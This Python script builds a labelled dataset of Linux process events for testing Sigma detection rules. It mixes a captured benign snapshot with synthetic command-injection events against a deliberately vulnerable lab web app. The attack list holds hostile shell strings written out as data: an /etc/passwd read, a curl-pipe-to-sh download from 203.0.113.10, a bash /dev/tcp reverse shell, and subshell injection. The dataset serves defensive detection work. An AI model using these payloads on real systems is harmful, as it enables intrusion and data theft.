"""Build the labelled Linux process dataset used by the Sigma validator.

    cd manager && python scripts/build_linux_validation_dataset.py

Sources, recorded per event in ``source``:
- ``lab_vps_snapshot``: real processes captured read-only from the lab VPS (knowledge/validation/
  vps_snapshot_20261126.json). Labelled benign: captured with no attack scenario running.
- ``synthetic_lab_code``: constructed events, clearly synthetic. Attack events reproduce the exact
  command shapes produced by agent/vulnerable_web/app.py (``subprocess.run(f"ping -c 1 {ip}",
  shell=True)`` and the /api/system-check emulation) under the real web-server parent process from
  the snapshot. Benign events cover legitimate parent→shell activity on the same host.

Labels never come from a LARP detector (no ``is_suspicious``). ``ground_truth_label`` is "attack" when
the event is the web application spawning a shell to run injected commands (or the authorised
emulation of it), else "benign". The output is deterministic.
"""
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1] / "knowledge" / "validation"
SNAPSHOT = ROOT / "vps_snapshot_20261126.json"
OUTPUT = ROOT / "linux_process_v1.jsonl"
USE_CASE = "web_server_spawning_shell"

# /bin/sh on Debian 13 is dash: psutil reports name "sh" and exe "/usr/bin/dash".
SH = {"name": "sh", "exe": "/usr/bin/dash"}


def snapshot():
    data = json.loads(SNAPSHOT.read_text())
    by_pid = {p["pid"]: p for p in data["processes"]}
    return data, by_pid


def event(event_id, source, timestamp, process, parent, label, scenario, basis):
    return {
        "event_id": event_id, "source": source, "timestamp": timestamp, "host": "ip-172-31-32-238",
        "process": process, "parent": parent, "ground_truth_label": label, "scenario": scenario,
        "label_basis": basis, "use_case": USE_CASE,
    }


def proc(name, exe, cmdline, pid, ppid):
    return {"name": name, "exe": exe, "cmdline": cmdline, "pid": pid, "ppid": ppid}


def parent_of(p):
    return {"name": p["name"], "exe": p["exe"], "cmdline": p["cmdline"], "pid": p["pid"]} if p else None


def build():
    data, by_pid = snapshot()
    stamp = data["captured_at"]
    rows = []
    for p in sorted(data["processes"], key=lambda x: x["pid"]):
        rows.append(event(f"vps-{p['pid']}", "lab_vps_snapshot", stamp,
                          proc(p["name"], p["exe"], p["cmdline"], p["pid"], p["ppid"]),
                          parent_of(by_pid.get(p["ppid"])), "benign", "vps_baseline",
                          "Captured read-only on the lab VPS with no attack scenario running."))

    web = next(p for p in data["processes"] if "vulnerable_web/app.py" in p["cmdline"])
    agent = next(p for p in data["processes"] if p["cmdline"].endswith("/opt/larp-agent/agent.py"))
    sshd = next(p for p in data["processes"] if p["name"] == "bash")
    web_parent = parent_of(web)
    synthetic = "synthetic_lab_code"

    attacks = [
        ("ping -c 1 127.0.0.1;id", "command_injection_id"),
        ("ping -c 1 127.0.0.1; cat /etc/passwd", "command_injection_read_file"),
        ("ping -c 1 127.0.0.1 && whoami", "command_injection_and"),
        ("ping -c 1 127.0.0.1|uname -a", "command_injection_pipe"),
        ("ping -c 1 127.0.0.1; curl -s http://203.0.113.10/s.sh | sh", "command_injection_download_exec"),
        ("ping -c 1 127.0.0.1; bash -i >& /dev/tcp/203.0.113.10/4444 0>&1", "command_injection_reverse_shell"),
        ("ping -c 1 `id`", "command_injection_backtick"),
        ("ping -c 1 $(whoami).203.0.113.10", "command_injection_subshell"),
    ]
    for n, (cmd, scenario) in enumerate(attacks, start=1):
        rows.append(event(f"syn-attack-{n:02d}", synthetic, stamp,
                          proc(SH["name"], SH["exe"], f"/bin/sh -c {cmd}", 70000 + n, web["pid"]), web_parent,
                          "attack", scenario,
                          "Shell spawned by the Flask app for /ping with injected shell metacharacters (app.py ping())."))
    rows.append(event("syn-attack-09", synthetic, stamp,
                      proc(SH["name"], SH["exe"], "/bin/sh -c /usr/bin/id >/dev/null 2>&1; /bin/sleep 45", 70009,
                           web["pid"]), web_parent, "attack", "authorized_attack_emulation",
                      "Authorised /api/system-check emulation of a web server spawning a shell; must be detected."))

    benign = [
        # Legitimate /ping use: the app always spawns /bin/sh -c (shell=True) even without injection.
        (SH, "/bin/sh -c ping -c 1 8.8.8.8", web, "web_ping_legitimate"),
        (SH, "/bin/sh -c ping -c 1 127.0.0.1", web, "web_ping_legitimate"),
        (SH, "/bin/sh -c ping -c 1 example.com", web, "web_ping_legitimate"),
        # The Agent (same interpreter as the web app) running its fixed collectors.
        ({"name": "ss", "exe": "/usr/bin/ss"}, "ss -H -tanpe", agent, "agent_collector"),
        ({"name": "ip", "exe": "/usr/bin/ip"}, "ip -j route show table all", agent, "agent_collector"),
        ({"name": "ufw", "exe": "/usr/sbin/ufw"}, "/usr/sbin/ufw status verbose", agent, "agent_collector"),
        ({"name": "nft", "exe": "/usr/sbin/nft"}, "nft -j list ruleset", agent, "agent_collector"),
        # Administrative shells and system jobs.
        ({"name": "sudo", "exe": "/usr/bin/sudo"}, "sudo systemctl status larp-agent", sshd, "admin_session"),
        ({"name": "systemctl", "exe": "/usr/bin/systemctl"}, "systemctl status vulnerable-web", sshd, "admin_session"),
        (SH, "/bin/sh -c test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily",
         {"name": "cron", "exe": "/usr/sbin/cron", "cmdline": "/usr/sbin/cron -f", "pid": 812}, "cron_job"),
        (SH, "/bin/sh -c /usr/lib/apt/apt.systemd.daily update",
         {"name": "systemd", "exe": "/usr/lib/systemd/systemd", "cmdline": "/sbin/init", "pid": 1}, "systemd_unit"),
        (SH, "/bin/sh -c /usr/share/debconf/frontend /var/lib/dpkg/info/libc-bin.postinst configure",
         {"name": "dpkg", "exe": "/usr/bin/dpkg", "cmdline": "/usr/bin/dpkg --configure -a", "pid": 61002},
         "package_maintenance"),
    ]
    for n, (child, cmd, parent, scenario) in enumerate(benign, start=1):
        rows.append(event(f"syn-benign-{n:02d}", synthetic, stamp,
                          proc(child["name"], child["exe"], cmd, 71000 + n, parent["pid"]), parent_of(parent),
                          "benign", scenario, "Legitimate activity on the lab host; no injected commands."))
    return rows


def main():
    rows = build()
    OUTPUT.write_text("".join(json.dumps(r, sort_keys=True, ensure_ascii=False) + "\n" for r in rows))
    attack = sum(r["ground_truth_label"] == "attack" for r in rows)
    print(f"{OUTPUT.name}: {len(rows)} events ({attack} attack, {len(rows) - attack} benign)")


if __name__ == "__main__":
    main()
